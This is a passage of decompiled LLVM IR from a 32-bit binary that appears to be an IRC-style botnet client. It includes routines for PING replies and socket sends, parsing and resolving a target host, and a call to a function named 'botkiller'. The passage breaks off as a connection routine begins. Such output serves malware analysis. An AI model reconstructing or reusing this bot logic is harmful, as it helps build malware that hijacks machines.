  %v3_8048f3711.pre = phi i32 [ %v2_8048ec7, %dec_label_pc_8048ec0 ], [ %v5_8048f08, %dec_label_pc_8048ef9 ], [ %v4_8048ee7, %dec_label_pc_8048ee7 ], [ %v4_8048ee7, %dec_label_pc_8048ef0 ]
  br label %dec_label_pc_8048f31

dec_label_pc_8048f1f:                             ; preds = %dec_label_pc_8048f31
  %v5_8048f22 = ptrtoint i8* %v4_8048f22132 to i32
  %v6_8048f22 = add i32 %v5_8048f22, %storemerge15
  %v1_8048f25 = inttoptr i32 %v6_8048f22 to i8*
  %v2_8048f25 = load i8, i8* %v1_8048f25, align 1
  %v7_8048f27 = icmp eq i8 %v2_8048f25, 32
  %v1_8048f29 = icmp eq i1 %v7_8048f27, false
  br i1 %v1_8048f29, label %dec_label_pc_8048f2e, label %dec_label_pc_8048f2b

dec_label_pc_8048f2b:                             ; preds = %dec_label_pc_8048f1f
  %v4_8048f2b = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_8048f2e

dec_label_pc_8048f2e:                             ; preds = %dec_label_pc_8048f1f, %dec_label_pc_8048f2b
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_8048f1f ], [ %v4_8048f2b, %dec_label_pc_8048f2b ]
  %v4_8048f2e = add i32 %storemerge15, 1
  br label %dec_label_pc_8048f31

dec_label_pc_8048f31:                             ; preds = %dec_label_pc_8048f31.preheader, %dec_label_pc_8048f2e
  %v3_8048f3711 = phi i32 [ %v5_8048f22, %dec_label_pc_8048f2e ], [ %v3_8048f3711.pre, %dec_label_pc_8048f31.preheader ]
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8048f2e ], [ 0, %dec_label_pc_8048f31.preheader ]
  %storemerge15 = phi i32 [ %v4_8048f2e, %dec_label_pc_8048f2e ], [ 0, %dec_label_pc_8048f31.preheader ]
  store i32 %storemerge15, i32* @ebx, align 4
  %v0_8048f3a.cast = inttoptr i32 %v3_8048f3711 to i8*
  %v3_8048f3a = call i32 @strlen(i8* %v0_8048f3a.cast)
  %v0_8048f42 = load i32, i32* @ebx, align 4
  %v7_8048f42 = icmp ult i32 %v0_8048f42, %v3_8048f3a
  br i1 %v7_8048f42, label %dec_label_pc_8048f1f, label %dec_label_pc_8048f46

dec_label_pc_8048f46:                             ; preds = %dec_label_pc_8048f31
  %v4_8048f46 = add i32 %stack_var_-16.1, 1
  %v7_8048f4d = icmp sgt i32 %v4_8048f46, 10
  %.v4_8048f46 = select i1 %v7_8048f4d, i32 10, i32 %v4_8048f46
  %v0_8048f63 = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_8048f46, 4
  %v3_8048f63 = add i32 %tmp, -68
  %v4_8048f63 = add i32 %v3_8048f63, %v0_8048f63
  %v5_8048f63 = inttoptr i32 %v4_8048f63 to i32*
  store i32 ptrtoint (i32* @global_var_80543b2.281 to i32), i32* %v5_8048f63, align 4
  %v3_8048ffd.pre = load i8*, i8** %stack_var_-20, align 4
  %v4_8048ffd102 = ptrtoint i8* %v3_8048ffd.pre to i32
  %v2_8049000103 = load i8, i8* %v3_8048ffd.pre, align 1
  %v4_8049002107 = icmp eq i8 %v2_8049000103, 0
  %v1_8049004109 = icmp eq i1 %v4_8049002107, false
  br i1 %v1_8049004109, label %dec_label_pc_8048f77, label %dec_label_pc_804900a

dec_label_pc_8048f77:                             ; preds = %dec_label_pc_8048f46, %dec_label_pc_8048fb3
  %v4_8048ffd111 = phi i32 [ %v6_8048ffa, %dec_label_pc_8048fb3 ], [ %v4_8048ffd102, %dec_label_pc_8048f46 ]
  %stack_var_-12.0110 = phi i32 [ %v4_8048ff4, %dec_label_pc_8048fb3 ], [ 1, %dec_label_pc_8048f46 ]
  %v5_8048f77 = add i32 %v4_8048ffd111, 1
  %v22_8048f77 = inttoptr i32 %v5_8048f77 to i8*
  store i8* %v22_8048f77, i8** %stack_var_-20, align 4
  %v5_8048f80 = icmp slt i32 %stack_var_-12.0110, %.v4_8048f46
  br i1 %v5_8048f80, label %dec_label_pc_8048f92.preheader, label %dec_label_pc_804900a

dec_label_pc_8048f92.preheader:                   ; preds = %dec_label_pc_8048f77
  br label %dec_label_pc_8048f92

dec_label_pc_8048f8f:                             ; preds = %dec_label_pc_8048fa7
  %v4_8048f8f = add i32 %storemerge14, 1
  br label %dec_label_pc_8048f92

dec_label_pc_8048f92:                             ; preds = %dec_label_pc_8048f92.preheader, %dec_label_pc_8048f8f
  %storemerge14 = phi i32 [ %v4_8048f8f, %dec_label_pc_8048f8f ], [ 0, %dec_label_pc_8048f92.preheader ]
  %v0_8048f9b.cast = inttoptr i32 %v5_8048f77 to i8*
  %v3_8048f9b = call i32 @strlen(i8* %v0_8048f9b.cast)
  %v7_8048fa3 = icmp ult i32 %storemerge14, %v3_8048f9b
  %v1_8048fa5 = icmp eq i1 %v7_8048fa3, false
  br i1 %v1_8048fa5, label %dec_label_pc_8048fb3, label %dec_label_pc_8048fa7

dec_label_pc_8048fa7:                             ; preds = %dec_label_pc_8048f92
  %v6_8048faa = add i32 %v5_8048f77, %storemerge14
  %v1_8048fad = inttoptr i32 %v6_8048faa to i8*
  %v2_8048fad = load i8, i8* %v1_8048fad, align 1
  %v7_8048faf = icmp eq i8 %v2_8048fad, 32
  %v1_8048fb1 = icmp eq i1 %v7_8048faf, false
  br i1 %v1_8048fb1, label %dec_label_pc_8048f8f, label %dec_label_pc_8048fb3

dec_label_pc_8048fb3:                             ; preds = %dec_label_pc_8048fa7, %dec_label_pc_8048f92
  store i32 %stack_var_-12.0110, i32* @ebx, align 4
  %v1_8048fb9 = add i32 %storemerge14, 1
  %v2_8048fbe = call i32 @malloc(i32 %v1_8048fb9)
  %v1_8048fc6 = load i32, i32* @ebp, align 4
  %v2_8048fc6 = load i32, i32* @ebx, align 4
  %v3_8048fc6 = mul i32 %v2_8048fc6, 4
  %v4_8048fc6 = add i32 %v1_8048fc6, -72
  %v5_8048fc6 = add i32 %v4_8048fc6, %v3_8048fc6
  %v6_8048fc6 = inttoptr i32 %v5_8048fc6 to i32*
  store i32 %v2_8048fbe, i32* %v6_8048fc6, align 4
  %v0_8048fd0 = load i32, i32* @ebp, align 4
  %v2_8048fd0 = mul nuw nsw i32 %stack_var_-12.0110, 4
  %v3_8048fd0 = add nuw nsw i32 %v2_8048fd0, -72
  %v4_8048fd0 = add i32 %v0_8048fd0, %v3_8048fd0
  %v5_8048fd0 = inttoptr i32 %v4_8048fd0 to i32*
  %v6_8048fd0 = load i32, i32* %v5_8048fd0, align 4
  %v3_8048fd8 = load i8*, i8** %stack_var_-20, align 4
  %v4_8048fd8 = ptrtoint i8* %v3_8048fd8 to i32
  %v4_8048fdc = call i32 @strncpy(i32 %v6_8048fd0, i32 %v4_8048fd8, i32 %storemerge14)
  %v0_8048fe7 = load i32, i32* @ebp, align 4
  %v4_8048fe7 = add i32 %v0_8048fe7, %v3_8048fd0
  %v5_8048fe7 = inttoptr i32 %v4_8048fe7 to i32*
  %v6_8048fe7 = load i32, i32* %v5_8048fe7, align 4
  %v2_8048fee = add i32 %v6_8048fe7, %storemerge14
  %v1_8048ff1 = inttoptr i32 %v2_8048fee to i8*
  store i8 0, i8* %v1_8048ff1, align 1
  %v4_8048ff4 = add nuw nsw i32 %stack_var_-12.0110, 1
  %v3_8048ffa = load i8*, i8** %stack_var_-20, align 4
  %v4_8048ffa = ptrtoint i8* %v3_8048ffa to i32
  %v6_8048ffa = add i32 %v4_8048ffa, %storemerge14
  %v26_8048ffa = inttoptr i32 %v6_8048ffa to i8*
  store i8* %v26_8048ffa, i8** %stack_var_-20, align 4
  %v2_8049000 = load i8, i8* %v26_8048ffa, align 1
  %v4_8049002 = icmp eq i8 %v2_8049000, 0
  %v1_8049004 = icmp eq i1 %v4_8049002, false
  br i1 %v1_8049004, label %dec_label_pc_8048f77, label %dec_label_pc_804900a

dec_label_pc_804900a:                             ; preds = %dec_label_pc_8048fb3, %dec_label_pc_8048f77, %dec_label_pc_8048f46
  %v4_8049081 = load i32, i32* bitcast ([4 x i8]** @global_var_80564c0.283 to i32*), align 8
  %v1_8049088 = icmp eq i32 %v4_8049081, 0
  %v1_804908a = icmp eq i1 %v1_8049088, false
  br i1 %v1_804908a, label %dec_label_pc_8049013, label %dec_label_pc_804908c

dec_label_pc_8049013:                             ; preds = %dec_label_pc_804900a
  %v5_8049027 = inttoptr i32 %v4_8049081 to i8*
  %v4_8049028 = call i32 @strcasecmp(i8* %v5_8049027, i32 %v2_8048e49)
  %v4_8049037 = load i32, i32* @global_var_80564c4.284, align 4
  call void @__pseudo_call(i32 %v4_8049037)
  %v5_8049077100 = icmp sgt i32 %.v4_8048f46, 1
  br i1 %v5_8049077100, label %dec_label_pc_804905b.lr.ph, label %dec_label_pc_804908c

dec_label_pc_804905b.lr.ph:                       ; preds = %dec_label_pc_8049013
  br label %dec_label_pc_804905b

dec_label_pc_804905b:                             ; preds = %dec_label_pc_804905b.lr.ph, %dec_label_pc_804905b
  %storemerge101 = phi i32 [ 1, %dec_label_pc_804905b.lr.ph ], [ %v4_804906e, %dec_label_pc_804905b ]
  %v0_804905e = load i32, i32* @ebp, align 4
  %v2_804905e = mul nuw nsw i32 %storemerge101, 4
  %v3_804905e = add nuw nsw i32 %v2_804905e, -72
  %v4_804905e = add i32 %v3_804905e, %v0_804905e
  %v5_804905e = inttoptr i32 %v4_804905e to i32*
  %v6_804905e = load i32, i32* %v5_804905e, align 4
  store i32 %v6_804905e, i32* @eax, align 4
  %v1_8049066 = call i32 @free(i32 %v6_804905e)
  %v4_804906e = add nuw nsw i32 %storemerge101, 1
  %v5_8049077 = icmp slt i32 %v4_804906e, %.v4_8048f46
  br i1 %v5_8049077, label %dec_label_pc_804905b, label %dec_label_pc_804908c

dec_label_pc_804908c:                             ; preds = %dec_label_pc_8049013, %dec_label_pc_804905b, %dec_label_pc_804900a, %dec_label_pc_8048e9a, %dec_label_pc_8048e2d, %dec_label_pc_8048e17
  %v0_8049090 = phi i32 [ %v4_8049081, %dec_label_pc_804900a ], [ %v4_8048eb0, %dec_label_pc_8048e9a ], [ %v4_8048e39, %dec_label_pc_8048e2d ], [ %v6_8048e23, %dec_label_pc_8048e17 ], [ 1, %dec_label_pc_8049013 ], [ %.v4_8048f46, %dec_label_pc_804905b ]
  ret i32 %v0_8049090

; uselistorder directives
  uselistorder i32 %storemerge101, { 1, 0 }
  uselistorder i32 %v6_8048ffa, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v5_8048f77, { 1, 0, 2 }
  uselistorder i32 %stack_var_-12.0110, { 3, 2, 1, 0 }
  uselistorder i32 %.v4_8048f46, { 1, 4, 2, 3, 0 }
  uselistorder i32 %storemerge15, { 2, 0, 1 }
  uselistorder i32 %v5_8048f22, { 1, 0 }
  uselistorder i32 %v4_8048f0b, { 1, 0 }
  uselistorder i8* %v22_8048f08, { 0, 2, 1 }
  uselistorder i8* %v3_8048ee7, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 %v3_8048ed3, { 1, 0 }
  uselistorder i8* %v3_8048ea8, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 0, 3, 2 }
  uselistorder i32 %.pre44, { 1, 0 }
  uselistorder i32 %storemerge18, { 0, 2, 1 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %storemerge19, { 1, 0, 2 }
  uselistorder i8** %stack_var_-20, { 11, 10, 9, 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804908c, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804905b, { 1, 0 }
  uselistorder label %dec_label_pc_8048f92, { 1, 0 }
  uselistorder label %dec_label_pc_8048f77, { 1, 0 }
  uselistorder label %dec_label_pc_8048f31, { 1, 0 }
  uselistorder label %dec_label_pc_8048f2e, { 1, 0 }
  uselistorder label %dec_label_pc_8048f31.preheader, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048ee7, { 1, 0 }
  uselistorder label %dec_label_pc_8048e9a, { 1, 0 }
  uselistorder label %dec_label_pc_8048e79, { 1, 0 }
  uselistorder label %dec_label_pc_8048df6, { 1, 0 }
  uselistorder label %dec_label_pc_8048dae, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049097 = load i32, i32* @global_var_8056f34.280, align 4
  %v4_80490a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_80543b4.285 to i32), i32 %v0_8049097)
  %v0_80490b5 = load i32, i32* @global_var_8056f4c.275, align 4
  store i32 %v0_80490b5, i32* @edx, align 4
  %v4_80490c5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_80543c3.287 to i32), i32 %v0_80490b5)
  %v0_80490cd = load i32, i32* @global_var_8056f34.280, align 4
  %v4_80490de = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_80543d0.288 to i32), i32 %v0_80490cd)
  ret i32 %v4_80490de

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80490fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_80543d8.289 to i32), i32 %arg2)
  ret i32 %v4_80490fc
}

define i32 @_352(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i8*, align 4
  %stack_var_-28 = alloca i8, align 1
  store i8* %arg1, i8** %stack_var_-16, align 4
  br label %dec_label_pc_8049129.preheader

dec_label_pc_8049123:                             ; preds = %dec_label_pc_804913e
  %v5_8049123 = add i32 %.pre62, 1
  %v22_8049123 = inttoptr i32 %v5_8049123 to i8*
  store i8* %v22_8049123, i8** %stack_var_-16, align 4
  %v4_8049126 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_8049129

dec_label_pc_8049129:                             ; preds = %dec_label_pc_8049129.preheader, %dec_label_pc_8049123
  %v3_8049147 = phi i8* [ %v22_8049123, %dec_label_pc_8049123 ], [ %v4_804919c99, %dec_label_pc_8049129.preheader ]
  %stack_var_-24.0 = phi i32 [ %v4_8049126, %dec_label_pc_8049123 ], [ %stack_var_-24.1100, %dec_label_pc_8049129.preheader ]
  %v3_8049132 = call i32 @strlen(i8* %arg1)
  %v7_804913a = icmp ult i32 %stack_var_-24.0, %v3_8049132
  %v1_804913c = icmp eq i1 %v7_804913a, false
  %.pre62 = ptrtoint i8* %v3_8049147 to i32
  br i1 %v1_804913c, label %dec_label_pc_8049147, label %dec_label_pc_804913e

dec_label_pc_804913e:                             ; preds = %dec_label_pc_8049129
  %v2_8049141 = load i8, i8* %v3_8049147, align 1
  %v7_8049143 = icmp eq i8 %v2_8049141, 32
  %v1_8049145 = icmp eq i1 %v7_8049143, false
  br i1 %v1_8049145, label %dec_label_pc_8049123, label %dec_label_pc_8049147

dec_label_pc_8049147:                             ; preds = %dec_label_pc_8049129, %dec_label_pc_804913e
  %v5_8049147 = add i32 %.pre62, 1
  %v22_8049147 = inttoptr i32 %v5_8049147 to i8*
  store i8* %v22_8049147, i8** %stack_var_-16, align 4
  %v3_8049153 = call i32 @strlen(i8* %arg1)
  %v12_804915b = icmp eq i32 %stack_var_-24.0, %v3_8049153
  br i1 %v12_804915b, label %dec_label_pc_80492f4, label %dec_label_pc_8049163

dec_label_pc_8049163:                             ; preds = %dec_label_pc_8049147
  %v4_8049163 = add nuw nsw i32 %storemerge17101, 1
  %v7_804916a = icmp sgt i32 %storemerge17101, 3
  br i1 %v7_804916a, label %dec_label_pc_8049178.preheader, label %dec_label_pc_8049129.preheader

dec_label_pc_8049129.preheader:                   ; preds = %entry, %dec_label_pc_8049163
  %storemerge17101 = phi i32 [ 0, %entry ], [ %v4_8049163, %dec_label_pc_8049163 ]
  %stack_var_-24.1100 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_8049163 ]
  %v4_804919c99 = phi i8* [ %arg1, %entry ], [ %v22_8049147, %dec_label_pc_8049163 ]
  br label %dec_label_pc_8049129

dec_label_pc_8049178.preheader:                   ; preds = %dec_label_pc_8049163
  %tmp79 = bitcast i8** %stack_var_-16 to i32*
  br label %dec_label_pc_8049178

dec_label_pc_8049175:                             ; preds = %dec_label_pc_804918d
  %v4_8049175 = add i32 %storemerge14, 1
  br label %dec_label_pc_8049178

dec_label_pc_8049178:                             ; preds = %dec_label_pc_8049178.preheader, %dec_label_pc_8049175
  %storemerge14 = phi i32 [ %v4_8049175, %dec_label_pc_8049175 ], [ 0, %dec_label_pc_8049178.preheader ]
  store i32 %storemerge14, i32* @ebx, align 4
  %v3_8049181 = call i32 @strlen(i8* %v22_8049147)
  %v0_8049189 = load i32, i32* @ebx, align 4
  %v7_8049189 = icmp ult i32 %v0_8049189, %v3_8049181
  %v1_804918b = icmp eq i1 %v7_8049189, false
  %.pre43 = add i32 %storemerge14, %v5_8049147
  br i1 %v1_804918b, label %dec_label_pc_8049178.dec_label_pc_8049199_crit_edge, label %dec_label_pc_804918d

dec_label_pc_8049178.dec_label_pc_8049199_crit_edge: ; preds = %dec_label_pc_8049178
  %.pre50 = inttoptr i32 %.pre43 to i8*
  br label %dec_label_pc_8049199

dec_label_pc_804918d:                             ; preds = %dec_label_pc_8049178
  %v1_8049193 = inttoptr i32 %.pre43 to i8*
  %v2_8049193 = load i8, i8* %v1_8049193, align 1
  %v7_8049195 = icmp eq i8 %v2_8049193, 32
  %v1_8049197 = icmp eq i1 %v7_8049195, false
  br i1 %v1_8049197, label %dec_label_pc_8049175, label %dec_label_pc_8049199

dec_label_pc_8049199:                             ; preds = %dec_label_pc_804918d, %dec_label_pc_8049178.dec_label_pc_8049199_crit_edge
  %v1_804919f.pre-phi = phi i8* [ %.pre50, %dec_label_pc_8049178.dec_label_pc_8049199_crit_edge ], [ %v1_8049193, %dec_label_pc_804918d ]
  store i8 0, i8* %v1_804919f.pre-phi, align 1
  %v0_80491a2 = load i32, i32* @global_var_8056f34.280, align 4
  %v3_80491ab7 = load i32, i32* %tmp79, align 4
  %v0_80491ae.cast = inttoptr i32 %v3_80491ab7 to i8*
  %v4_80491ae = call i32 @strcasecmp(i8* %v0_80491ae.cast, i32 %v0_80491a2)
  %v1_80491b6 = icmp eq i32 %v4_80491ae, 0
  %v1_80491b8 = icmp eq i1 %v1_80491b6, false
  br i1 %v1_80491b8, label %dec_label_pc_80492f4, label %dec_label_pc_80491be

dec_label_pc_80491be:                             ; preds = %dec_label_pc_8049199
  %v0_80491be = load i32, i32* @global_var_805656c.290, align 4
  %v1_80491c3 = icmp eq i32 %v0_80491be, 0
  %v1_80491c5 = icmp eq i1 %v1_80491c3, false
  br i1 %v1_80491c5, label %dec_label_pc_80492f4, label %dec_label_pc_80491cb

dec_label_pc_80491cb:                             ; preds = %dec_label_pc_80491be
  store i8* %arg1, i8** %stack_var_-16, align 4
  br label %dec_label_pc_80491e7.preheader

dec_label_pc_80491e1:                             ; preds = %dec_label_pc_80491fc
  %v5_80491e1 = add i32 %.pre61, 1
  %v22_80491e1 = inttoptr i32 %v5_80491e1 to i8*
  store i8* %v22_80491e1, i8** %stack_var_-16, align 4
  %v4_80491e4 = add i32 %stack_var_-24.2, 1
  br label %dec_label_pc_80491e7

dec_label_pc_80491e7:                             ; preds = %dec_label_pc_80491e7.preheader, %dec_label_pc_80491e1
  %v3_8049205 = phi i8* [ %v22_80491e1, %dec_label_pc_80491e1 ], [ %v4_804925a96, %dec_label_pc_80491e7.preheader ]
  %stack_var_-24.2 = phi i32 [ %v4_80491e4, %dec_label_pc_80491e1 ], [ %stack_var_-24.397, %dec_label_pc_80491e7.preheader ]
  %v3_80491f0 = call i32 @strlen(i8* %arg1)
  %v7_80491f8 = icmp ult i32 %stack_var_-24.2, %v3_80491f0
  %v1_80491fa = icmp eq i1 %v7_80491f8, false
  %.pre61 = ptrtoint i8* %v3_8049205 to i32
  br i1 %v1_80491fa, label %dec_label_pc_8049205, label %dec_label_pc_80491fc

dec_label_pc_80491fc:                             ; preds = %dec_label_pc_80491e7
  %v2_80491ff = load i8, i8* %v3_8049205, align 1
  %v7_8049201 = icmp eq i8 %v2_80491ff, 32
  %v1_8049203 = icmp eq i1 %v7_8049201, false
  br i1 %v1_8049203, label %dec_label_pc_80491e1, label %dec_label_pc_8049205

dec_label_pc_8049205:                             ; preds = %dec_label_pc_80491e7, %dec_label_pc_80491fc
  %v5_8049205 = add i32 %.pre61, 1
  %v22_8049205 = inttoptr i32 %v5_8049205 to i8*
  store i8* %v22_8049205, i8** %stack_var_-16, align 4
  %v3_8049211 = call i32 @strlen(i8* %arg1)
  %v12_8049219 = icmp eq i32 %stack_var_-24.2, %v3_8049211
  br i1 %v12_8049219, label %dec_label_pc_80492f4, label %dec_label_pc_8049221

dec_label_pc_8049221:                             ; preds = %dec_label_pc_8049205
  %v4_8049221 = add nuw nsw i32 %storemerge1398, 1
  %v7_8049228 = icmp sgt i32 %storemerge1398, 1
  br i1 %v7_8049228, label %dec_label_pc_8049236, label %dec_label_pc_80491e7.preheader

dec_label_pc_80491e7.preheader:                   ; preds = %dec_label_pc_80491cb, %dec_label_pc_8049221
  %storemerge1398 = phi i32 [ 0, %dec_label_pc_80491cb ], [ %v4_8049221, %dec_label_pc_8049221 ]
  %stack_var_-24.397 = phi i32 [ 0, %dec_label_pc_80491cb ], [ %stack_var_-24.2, %dec_label_pc_8049221 ]
  %v4_804925a96 = phi i8* [ %arg1, %dec_label_pc_80491cb ], [ %v22_8049205, %dec_label_pc_8049221 ]
  br label %dec_label_pc_80491e7

dec_label_pc_8049233:                             ; preds = %dec_label_pc_804924b
  %v4_8049233 = add i32 %storemerge, 1
  br label %dec_label_pc_8049236

dec_label_pc_8049236:                             ; preds = %dec_label_pc_8049221, %dec_label_pc_8049233
  %storemerge = phi i32 [ %v4_8049233, %dec_label_pc_8049233 ], [ 0, %dec_label_pc_8049221 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v3_804923f = call i32 @strlen(i8* %v22_8049205)
  %v0_8049247 = load i32, i32* @ebx, align 4
  %v7_8049247 = icmp ult i32 %v0_8049247, %v3_804923f
  %v1_8049249 = icmp eq i1 %v7_8049247, false
  %.pre52 = add i32 %storemerge, %v5_8049205
  br i1 %v1_8049249, label %dec_label_pc_8049236.dec_label_pc_8049257_crit_edge, label %dec_label_pc_804924b

dec_label_pc_8049236.dec_label_pc_8049257_crit_edge: ; preds = %dec_label_pc_8049236
  %.pre59 = inttoptr i32 %.pre52 to i8*
  br label %dec_label_pc_8049257

dec_label_pc_804924b:                             ; preds = %dec_label_pc_8049236
  %v1_8049251 = inttoptr i32 %.pre52 to i8*
  %v2_8049251 = load i8, i8* %v1_8049251, align 1
  %v7_8049253 = icmp eq i8 %v2_8049251, 32
  %v1_8049255 = icmp eq i1 %v7_8049253, false
  br i1 %v1_8049255, label %dec_label_pc_8049233, label %dec_label_pc_8049257

dec_label_pc_8049257:                             ; preds = %dec_label_pc_804924b, %dec_label_pc_8049236.dec_label_pc_8049257_crit_edge
  %v1_804925d.pre-phi = phi i8* [ %.pre59, %dec_label_pc_8049236.dec_label_pc_8049257_crit_edge ], [ %v1_8049251, %dec_label_pc_804924b ]
  store i8 0, i8* %v1_804925d.pre-phi, align 1
  %v3_80492639 = load i32, i32* %tmp79, align 4
  %v2_8049266 = call i32 @inet_addr(i32 %v3_80492639)
  %v3_8049266 = trunc i32 %v2_8049266 to i8
  store i8 %v3_8049266, i8* %stack_var_-28, align 1
  %sext = mul i32 %v2_8049266, 16777216
  %v4_8049271 = sdiv i32 %sext, 16777216
  store i32 %v4_8049271, i32* @eax, align 4
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8049277 = icmp eq i1 %tmp, false
  br i1 %v1_8049277, label %dec_label_pc_8049257.dec_label_pc_80492b1_crit_edge, label %dec_label_pc_8049279

dec_label_pc_8049257.dec_label_pc_80492b1_crit_edge: ; preds = %dec_label_pc_8049257
  br label %dec_label_pc_80492b1

dec_label_pc_8049279:                             ; preds = %dec_label_pc_8049257
  %v2_804927f = call i32 @gethostbyname(i32 %v3_80492639)
  %v4_804928a = icmp eq i32 %v2_804927f, 0
  br i1 %v4_804928a, label %dec_label_pc_80492f4, label %dec_label_pc_8049290

dec_label_pc_8049290:                             ; preds = %dec_label_pc_8049279
  %v1_8049293 = add i32 %v2_804927f, 12
  %v2_8049293 = inttoptr i32 %v1_8049293 to i32*
  %v3_8049293 = load i32, i32* %v2_8049293, align 4
  %v1_804929b = add i32 %v2_804927f, 16
  %v2_804929b = inttoptr i32 %v1_804929b to i32*
  %v3_804929b = load i32, i32* %v2_804929b, align 4
  %v1_804929e = inttoptr i32 %v3_804929b to i32*
  %v2_804929e = load i32, i32* %v1_804929e, align 4
  %v5_80492a9 = call i32 @memcpy(i8* nonnull %stack_var_-28, i32 %v2_804929e, i32 %v3_8049293)
  %v2_80492bc.pre = load i8, i8* %stack_var_-28, align 1
  br label %dec_label_pc_80492b1

dec_label_pc_80492b1:                             ; preds = %dec_label_pc_8049257.dec_label_pc_80492b1_crit_edge, %dec_label_pc_8049290
  %v2_80492bc = phi i8 [ %v3_8049266, %dec_label_pc_8049257.dec_label_pc_80492b1_crit_edge ], [ %v2_80492bc.pre, %dec_label_pc_8049290 ]
  store i8 %v2_80492bc, i8* bitcast (i8** @global_var_805656b.292 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8056568.291 to i8*), align 4
  store i32 256, i32* @global_var_805656c.290, align 4
  br label %dec_label_pc_80492f4

dec_label_pc_80492f4:                             ; preds = %dec_label_pc_8049147, %dec_label_pc_8049205, %dec_label_pc_8049279, %dec_label_pc_80491be, %dec_label_pc_8049199, %dec_label_pc_80492b1
  %v0_80492f8 = phi i32 [ 0, %dec_label_pc_8049279 ], [ %v0_80491be, %dec_label_pc_80491be ], [ %v4_80491ae, %dec_label_pc_8049199 ], [ ptrtoint (i8** @global_var_8056568.291 to i32), %dec_label_pc_80492b1 ], [ %v3_8049211, %dec_label_pc_8049205 ], [ %v3_8049153, %dec_label_pc_8049147 ]
  ret i32 %v0_80492f8

; uselistorder directives
  uselistorder i32 %v2_804927f, { 2, 1, 0 }
  uselistorder i32 %.pre52, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge1398, { 1, 0 }
  uselistorder i32 %v3_8049211, { 1, 0 }
  uselistorder i32 %stack_var_-24.2, { 2, 0, 1, 3 }
  uselistorder i8* %v3_8049205, { 1, 0 }
  uselistorder i32 %.pre43, { 1, 0 }
  uselistorder i32 %storemerge14, { 0, 2, 1 }
  uselistorder i32 %storemerge17101, { 1, 0 }
  uselistorder i32 %v3_8049153, { 1, 0 }
  uselistorder i32 %stack_var_-24.0, { 2, 0, 1, 3 }
  uselistorder i8* %v3_8049147, { 1, 0 }
  uselistorder i8** %stack_var_-16, { 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i8** @global_var_8056568.291, { 1, 0 }
  uselistorder i8* %arg1, { 1, 4, 3, 2, 0, 5, 7, 6 }
  uselistorder label %dec_label_pc_80492f4, { 5, 2, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_80492b1, { 1, 0 }
  uselistorder label %dec_label_pc_8049236, { 1, 0 }
  uselistorder label %dec_label_pc_80491e7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049205, { 1, 0 }
  uselistorder label %dec_label_pc_8049178, { 1, 0 }
  uselistorder label %dec_label_pc_8049129.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049147, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %stack_var_-62 = alloca i32, align 4
  %v0_80492ff = load i32, i32* @global_var_8056f34.280, align 4
  store i32 %v0_80492ff, i32* @eax, align 4
  %v1_8049308 = call i32 @free(i32 %v0_80492ff)
  %v2_8049317 = call i32 @makestring(i32 ptrtoint ([14 x i8]* @global_var_80543e1.295 to i32))
  %v2_8049325 = ptrtoint i32* %stack_var_-62 to i32
  %v3_8049329 = call i32 @strcpy(i32 %v2_8049325, i32 ptrtoint ([14 x i8]* @global_var_80543e1.295 to i32))
  %v3_804933b = bitcast i32* %stack_var_-62 to i8*
  %v4_804933b = call i32 @strcat(i8* %v3_804933b, i32 %v2_8049317)
  store i32 %v2_8049325, i32* @global_var_8056f34.280, align 4
  %v0_804934b = call i32 @botkiller()
  ret i32 %v0_804934b
}

define i32 @con() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i64 @__decompiler_undefined_function_2()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049352 = load i32, i32* @ebp, align 4
  store i32 %v0_8049352, i32* %stack_var_-4, align 4
  %v4_8049352 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049352, i32* @ebp, align 4
  %v15_8049355 = ptrtoint i32* %stack_var_-44 to i32
  %extract.t3 = trunc i64 %tmp26 to i32
  %v2_8049437 = ptrtoint i32* %stack_var_-32 to i32
  %v15_804943a = ptrtoint i32* %stack_var_-28 to i32
  %v2_8049480 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049358.backedge, %entry
